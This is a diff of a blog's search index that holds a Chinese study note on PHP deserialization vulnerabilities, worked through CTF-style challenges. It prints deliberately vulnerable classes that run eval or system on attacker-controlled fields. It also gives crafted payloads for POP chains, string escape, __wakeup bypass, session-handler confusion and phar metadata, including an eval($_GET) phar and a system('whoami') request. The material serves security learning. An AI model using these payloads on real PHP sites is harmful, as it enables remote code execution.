&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:114:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;
+
+例题&lt;?php// highlight_file(__FILE__);error_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hack&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass = &#x27;daydream&#x27;;	function __construct($user)	&#123;		$this-&gt;user = $user;	&#125;&#125;$param = $_GET[&#x27;param&#x27;];$param = serialize(new test($param));$profile = unserialize(filter($param));if ($profile-&gt;pass == &#x27;escaping&#x27;) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;
+
+目标:判断pass是否为escaping;用filter将php换成hack达到字符串增多
+目标逃逸代码:&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;,29个字符,所以需要29个php
+构造参数?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22%3Bs%3A4%3A%22pass%22%3Bs%3A8%3A%22escaping%22%3B%7D
+得到flag
+
+wakeup魔术方法绕过
+例题 &lt;?phperror_reporting(0);class secret&#123;    var $file=&#x27;index.php&#x27;;    public function __construct($file)&#123;        $this-&gt;file=$file;    &#125;    function __destruct()&#123;        include_once($this-&gt;file);        echo $flag;    &#125;    function __wakeup()&#123;        $this-&gt;file=&#x27;index.php&#x27;;    &#125;&#125;$cmd=$_GET[&#x27;cmd&#x27;];if (!isset($cmd))&#123;    highlight_file(__FILE__);&#125;else&#123;    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;        echo &quot;Are you daydreaming?&quot;;    &#125;    else&#123;        unserialize($cmd);    &#125;&#125;//sercet in flag.php?&gt;
+
+分析:要绕过__wakeup(),O:后面不能跟数字以绕过正则表达式
+&lt;?phpclass secret&#123;	var $file = &#x27;flag.php&#x27;;&#125;echo serialize(new secret()).&quot;\n&quot;;//获取原序列化字符串echo urlencode(&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;);//在数字前加上+绕过正则表达式,把属性数改大绕过wakeup?&gt;
+
+拿到flag
+
+引用php中引用为 &amp;
+&lt;?phpclass Test&#123;	public $a;	public $b;&#125;$test = new Test();$test-&gt;a = &amp;$test-&gt;b; // a是b的引用echo serialize($test).&quot;\n&quot;;/*O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;*/?&gt;
+
+
+
+例题&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;if (isset($_GET[&#x27;pass&#x27;])) &#123;    $pass = $_GET[&#x27;pass&#x27;];    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);&#125;$o = unserialize($pass);if ($o) &#123;    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)        echo &quot;Congratulation! Here is my secret: &quot;.$flag;    else        echo &quot;Oh no... You can&#x27;t fool me&quot;;&#125;else echo &quot;are you trolling?&quot;;?&gt;
+
+
+这题中传入引用即可
+&lt;?php// highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;$a = new just4fun();$a-&gt;enter = &amp;$a-&gt;secret;echo serialize($a);?&gt;
+
+
+session反序列化漏洞一个页面写入session，一个页面读出session
+
+
+
+
+
+例题no.1
+//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;ben&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 
+
+//读出session&lt;?php highlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class D&#123;    var $a;    function __destruct()&#123;        eval($this-&gt;a);//漏洞所在    &#125;&#125;?&gt; 
+
+以php_serialize方式写入,以php方式读出,php方式键名|序列化字符串,所以构造参数时要加|
+构造参数 ?a=|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
+no.2
+//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 
+
+//读出session&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;    &#125;&#125;?&gt; 
+
+分析:需要用到引用,以php_serialize方式写入session,php方式读出
+构造参数?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;;
+phar反序列化漏洞
+
+重点关注manifest这个字段
+manifest字段格式
+
+24byte后是序列化的字符串
+漏洞原理
+例题no.1
+ &lt;?phphighlight_file(__FILE__);class Testobj&#123;    var $output=&#x27;&#x27;;&#125;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; &lt;?phphighlight_file(__FILE__);error_reporting(0);class Testobj&#123;    var $output=&quot;echo &#x27;ok&#x27;;&quot;;    function __destruct()    &#123;        eval($this-&gt;output);    &#125;&#125;if(isset($_GET[&#x27;filename&#x27;]))&#123;    $filename=$_GET[&#x27;filename&#x27;];    var_dump(file_exists($filename));&#125;?&gt; 
+
+分析:phar中manifest的值是对Testobj中$output=eval($_GET[&#39;a&#39;])进行序列化后得到的字符串,反序列化必然会调用__destruct(),相当于eval(eval($_GET[&#39;a&#39;])),执行了eval($_GET[&#39;a&#39;]),所以要传入两个参数,$filename处就可以传入phar伪协议参数,??filename=phar://test.phar&amp;a=system(&#39;whoami&#39;);
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>PHP反序列化</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java-web</title>
     <url>/2025/05/24/javaweb/</url>
     <content><![CDATA[nginx打包部署#vue项目目录下npm run build
@@ -915,309 +1218,6 @@ EmpServer的实现类
       </categories>
       <tags>
         <tag>JavaWeb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php反序列化漏洞</title>
-    <url>/2025/05/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[反序列化漏洞成因：反序列化unserialize()中接收的字符串可控，通过更改字符串得到想要的对象
-php面向对象基础知识php中类和对象的写法class Test&#123;	var $name;//不推荐用var修饰，可以用public,private,protected修饰（与java一致）	var $id;	function __construct($name = null,$id = null)&#123;//构造函数		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;class Test&#123;	var $name;	var $id;	function __construct($name = null,$id = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;$a = new Test();$a-&gt;name=&#x27;senpai&#x27;;$a-&gt;id=114514;print_r($a);/*print_r()打印对象实例的结果就是:&gt;Test Object(    [name] =&gt; senpai    [id] =&gt; 114514)[Finished in 852ms]*/
-
-php中构造函数不支持重载，如果想实现无参构造器和有参构造器都存在，要在参数中设置默认值;php访问内部成员用的是$this-&gt;成员变量名
-序列化
-可以进行序列化的内容：
-对象，数组，标量类型（整形，浮点，布尔，字符串），包含资源的数组和对象，null
-不能序列化的内容：
-类，资源（比如数据库连接），未定义类型
-
-字符串长度用于确定头尾双引号位置，防止出现 &quot;benben&quot;adada&quot;这种中间带有双引号报错的情况
-
-a:参数数量:&#123;i:索引;对应的序列化内容;&#125;
-
-
-O:类名长度:&quot;类名&quot;:变量数:&#123;s:变量名长度:&quot;变量名&quot;;变量值的序列化内容;&#125;
-private属性的成员变量序列化后，变量名前会加上0x00类名0x00(0x00是不可见字符，url编码后就是%00)
-protected属性的成员变量序列化后，变量名前会加上0x00*0x00
-&lt;?php	class Test&#123;		public $name;		private $id;	&#125;	$a = 1;	$b = &#x27;hello world!&#x27;;	$c = new Test();	$d = [1,2,3,4];	$e = 1.14514;	$f = null;	echo serialize($a).&quot;\n&quot;;	echo serialize($b).&quot;\n&quot;;	echo serialize($c).&quot;\n&quot;;	echo serialize($d).&quot;\n&quot;;	echo serialize($e).&quot;\n&quot;;	echo serialize($f);?&gt;/*i:1;s:12:&quot;hello world!&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;&lt;0x00&gt;Test&lt;0x00&gt;id&quot;;N;&#125;a:4:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;&#125;d:1.14514;N;   [Finished in 1.1s]*/
-
-
-
-反序列化反序列化就是将字符串变成对象 unserialize(string $str)
-
-
-例题
-get方法传进来的变量benben就是序列化字符串
-
-/*自动把get请求收到的参数拼接到序列化字符串中*/$get = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:&#x27;.strlen($_GET[&#x27;benben&#x27;]).&#x27;:&quot;&#x27;.$_GET[&#x27;benben&#x27;].&#x27;&quot;;&#125;&#x27;;
-
-构造url，用?传递get请求的参数(这里我让他弹窗)
-?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:36:&quot;echo &quot;&lt;script&gt;alert(123);&lt;/script&gt;&quot;;&quot;;&#125;
-使用var_dump()打印对象细节&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	var_dump($a);?&gt;/*object(Test)#1 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;   [Finished in 933ms]*/
-
-&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;//复制echo内容	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/
-
-/**/&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	/*反序列化生成对象中成员变量的值，由提供给反序列化的序列化字符串中的值决定*/	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;德川&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;�Test�name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;�*�sex&quot;;s:3:&quot;男&quot;;&#125;object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;德川&quot; 输出德川而不是最开始的淳平，因为更改了序列化字符串  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/
-
-魔术方法魔术方法：在特定条件下自动触发的方法
-触发前提：魔术方法所在的类或对象被调用
-
-魔术方法必须掌握触发时机，参数，返回值
-
-常见魔术方法
-
-构造与析构/*构造触发时机:当new对象时自动调用（构造器）功能:初始化对象参数:非必要返回值:无*/function __construct(args...);/*析构触发时机:对象的所有引用被删除或对象被显式销毁时执行,反序列化之后执行,代码运行结束执行功能:参数:无返回值:无*/function __destruct();&lt;?phpclass Test&#123;	public $name;	public function __construct()&#123;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test();//触发__construct();$str  = serialize($a);$str1 = &#x27;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;&#x27;;$f = unserialize($str1); //触发__destruct();?&gt;//触发__destruct();    /*结果构造函数析构函数析构函数*/
-
-unserialize()触发析构函数是因为,反序列化是将原先实例销毁，再根据序列化字符串创建新对象
-&lt;?phpclass Test&#123;	public $name;	public function __construct($name = null)&#123;		$this-&gt;name = $name;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test(&#x27;淳平&#x27;);$str  = serialize($a);$f = unserialize($str);//$a被销毁了echo $a-&gt;name;//这里会警告$a为null?&gt;
-
-漏洞例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	var $cmd = &quot;echo &#x27;dazhuang666!!&#x27;;&quot;;	public function __destruct()	&#123;		eval($this-&gt;cmd);//漏洞在这	&#125;&#125;$ser = $_GET[&quot;benben&quot;];unserialize($ser);//会在这调用__destruct()?&gt;
-
-需要构造序列化字符串，将$cmd改成要执行的php命令
-/*构造字符串*/$str = &#x27;O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;&#x27;;
-
-构造url，拼接参数?benben=O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;到localhost/ser后
-sleep先进行__sleep()再serialize()
-
-function __sleep();/*返回要序列化的属性名的数组触发时机：执行serialize()之前功能：返回需要被序列化的成员参数：无返回值：包含需要被序列化的成员属性名的数组*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public  function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);//返回包含属性名的数组	&#125;	&#125;$a = new User(&#x27;淳平&#x27;,114514,&#x27;114514&#x27;);echo serialize($a);//结果中将不会有password-- - - - - -- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - /*O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;*/
-
-例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	const SITE = &#x27;uusama&#x27;;	public $username;	public $nickname;	private $password;	public function __construct($username, $nickname, $password)	&#123;		$this-&gt;username = $username;		$this-&gt;nickname = $nickname;		$this-&gt;password = $password;	&#125;	public function __sleep()	&#123;		system($this-&gt;username);//漏洞	&#125;&#125;$cmd = $_GET[&#x27;benben&#x27;];$user = new User($cmd, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);?&gt;
-
-因为__sleep()在serialize()前执行,$cmd对应的就是$username，所以我们只需要把get请求的参数换成任意的命令就行
-wakeup
-function __wakeup();/*触发时机：unserialize()之前功能：参数：返回值：*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);	&#125;	public function __wakeup()&#123;		$this-&gt;password = &#x27;114514&#x27;;//反序列化前调用，给password赋值	&#125;&#125;$str = &#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;&#x27;;//没有passwordvar_dump(unserialize($str));//password有值了?&gt;/*object(User)#1 (3) &#123;  [&quot;name&quot;]=&gt;  string(6) &quot;淳平&quot;  [&quot;id&quot;]=&gt;  int(114514)  [&quot;password&quot;:&quot;User&quot;:private]=&gt;  string(6) &quot;114514&quot;&#125;*/
-
-例题 &lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        system($this-&gt;username);//漏洞    &#125;&#125;$user_ser = $_GET[&#x27;benben&#x27;];//需要构造一个含有username的序列化字符串unserialize($user_ser);?&gt;
-
-思路:构造get参数为一个含有username的序列化字符串，username值为任意命令																		payload:  ?benben=O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
-toString和invokefunction __toString();/*触发时机：把对象当作字符串调用;调用对象要使用var_dump()或print_r(),使用echo或print就会调用__toString()功能：参数：返回值：字符串*/function __invoke();/*触发时机：把对象当作方法(函数)调用功能：参数：返回值：字符串*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __tostring()&#123;		return &#x27;这不是字符串!&#x27;;	&#125;	public function __invoke()&#123;		return &#x27;这不是方法!!&#x27;;	&#125;&#125;$a = new User(1,&#x27;a&#x27;,&#x27;c&#x27;);echo $a;//输出这不是字符串echo $a();//输出这不是方法?&gt;
-
-错误调用相关魔术方法call
-function __call($arg1,$arg2);/*触发时机:调用不存在的成员方法功能：参数:$arg1:方法名 $arg2:参数值的数组返回值:无*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __call($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;//把传进去的所有参数打印出来			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a-&gt;test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);//会调用call()?&gt;/*testabc*/
-
-callStatic
-function __callStatic($arg1,$arg2);/*php中调用成员常量或静态调用: ::$arg1:方法名	$arg2:参数值的数组*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public static function __callStatic($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a::test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);?&gt;
-
-get
-&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __get($arg1)	&#123;		echo $arg1;	&#125;&#125;$a = new User();$a-&gt;var2;?&gt;
-
-set
-&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __set($arg1,$arg2)&#123;		echo $arg1.$arg2;	&#125;&#125;$a = new User();$a-&gt;var2 = &#x27;111&#x27;;//会输出var2111?&gt;
-
-isset
-/*arg1就是不可访问变量的属性名*/&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __isset($arg1)&#123;		echo $arg1;	&#125;&#125;$a = new User();isset($a-&gt;password);//私有成员不可访问empty($a-&gt;password);?&gt;
-
-unset
-clone
-&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __clone()&#123;		echo &#x27;cloned!&#x27;;	&#125; &#125;$a = new User();$b = clone($a);//输出cloned!?&gt;
-
-总结表
-
-pop链前置知识 &lt;?phphighlight_file(__FILE__);error_reporting(0);class index &#123;    private $test;    public function __construct()&#123;        $this-&gt;test = new normal();    &#125;    public function __destruct()&#123;        $this-&gt;test-&gt;action();    &#125;&#125;class normal &#123;    public function action()&#123;        echo &quot;please attack me&quot;;    &#125;&#125;class evil &#123;    var $test2;    public function action()&#123;        eval($this-&gt;test2);//&lt;-漏洞    &#125;&#125;unserialize($_GET[&#x27;test&#x27;]);?&gt;
-
-反推法1.先找漏洞在哪，eval()函数处有漏洞2.eval调用evil的$test23.但是单单unserialize()并不会调用evil的action()4.unserialize()会调用__destruct()5.但是__destruct()中的$test是normal的实例6.要想办法构造序列化字符串使index中的$test变成evil的实例
-
-构造序列化字符串
-方法1:直接改代码加注释，在类里赋值，让php帮忙跑出想要的序列化字符串
-&lt;?php// highlight_file(__FILE__);error_reporting(0);class index&#123;	private $test;	public function __construct()	&#123;		$this-&gt;test = new evil();	&#125;	// public function __destruct()	// &#123;	// 	$this-&gt;test-&gt;action();	// &#125;&#125;// class normal// &#123;// 	public function action()// 	&#123;// 		echo &quot;please attack me&quot;;// 	&#125;// &#125;class evil&#123;	var $test2 = &#x27;echo &quot;Hello World!&quot;;&#x27;;	// public function action()	// &#123;	// 	eval($this-&gt;test2);	// &#125;&#125;// unserialize($_GET[&#x27;test&#x27;]);echo urlencode(serialize(new index()));?&gt;
-
-方法2:在类外进行赋值
-&lt;?phphighlight_file(__FILE__);error_reporting(0);class index&#123;	public $test;//偷偷改成public，如果是private就只能用第一种方式&#125;class evil&#123;	var $test2;&#125;$a = new evil();$a-&gt;test2 = &#x27;system(&quot;ls&quot;)&#x27;;$b = new index();$b-&gt;test = $a;echo serialize($b);?&gt;
-
-魔术方法触发规则触发前提：魔术方法所在的类或对象被调用
-eg:
- &lt;?phphighlight_file(__FILE__);error_reporting(0);class fast &#123;    public $source;    public function __wakeup()&#123;        echo &quot;wakeup is here!!&quot;;        echo  $this-&gt;source;//如果要触发toString(),这里的source就得是sec的对象    &#125;&#125;class sec &#123;    var $benben;    public function __tostring()&#123;        echo &quot;tostring is here!!&quot;;    &#125;&#125;$b = $_GET[&#x27;benben&#x27;];unserialize($b);?&gt;
-
-目标:显示tostring is here!!
-
-//生成序列化字符串的url编码&lt;?phperror_reporting(0);class fast&#123;	public $source;&#125;class sec&#123;	var $benben;&#125;$a = new fast();$b = new sec();$a-&gt;source = $b;echo urlencode(serialize($a));//输出O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D?&gt;
-
-构造url,?benben=O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D
-先执行wakeup()再执行toString()
-POP链构造与POC编写
-eg:
- &lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;//1.目的要输出$flag    &#125;    public function __invoke()&#123;//2.触发__invoke()调用append()并把$var设置成flag.php        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;//4.如果把$str赋值为Test，Test中没有source成员，就会触发__get()    &#125;    public function __wakeup()&#123;//6.最终unserialize()触发__wakeup()        echo $this-&gt;source;//5.触发toString(),把自己作为变量赋值给$source    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();//3.如果把$p变成Modifier,调用__get()就会触发Modifier的__invoke()    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;?&gt; 
-
-第一步：触发invoke，使$var = &#39;flag.php&#39;
-第二步：触发get，给$p赋值为对象Modifier
-第三步：触发toString，给$str赋值为对象Test
-第四步：触发wakeup，给source赋值为自己的对象
-因为wakeup在Show中，所以我们构造序列化字符串中传递的参数就是Show
-&lt;?php//flag is in flag.php// highlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var = &#x27;flag.php&#x27;;//私有属性就不能在外赋值了&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a  = new Modifier();$b = new Show();$c = new Test();$b-&gt;source = $b;$b-&gt;str = $c;$c-&gt;p = $a;echo urlencode(serialize($b));?&gt; 
-
-把url编码后的序列化字符串作为参数传入?pop=
-得到flag：&#96;&#96; ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;
-
-字符串逃逸利用str_replace()
-/** * @param array|string $search 要被替换的 * @param array|string $replace 要替换的 * @param array|string $subject 替换的对象 * @return void */function str_replace(array|string $search, array|string $replace, array|string $subject);
-
-
-反序列化时，属性长度不对，成员数量不对都无法进行序列化，会显示bool(false)
-&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//成员数量不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;&lt;?phperror_reporting(0);class Test&#123;	public $a;    public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1111:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//长度不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;
-
-如果反序列化时，忽略了某个存在的变量，序列化字符串中加上新的变量，最终反序列化结果会包含被忽略的变量和序列化字符串中的变量
-&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;N;&#125;&#x27;;var_dump(unserialize($ser_str));?&gt;&lt;!--object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  NULL&#125;&gt;
-
-为什么长度一定不能错?
-
-/*反序列化结束符为;&#125;*/&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;	public $c = &#x27;c&#x27;;&#125;$a = new Test();$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;s:1:&quot;c&quot;;&quot;ccc&quot;;&#125;&#x27;;var_dump(unserialize($ser_str));/*object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  string(1) &quot;c&quot;&#125;*/?&gt;
-
-减少
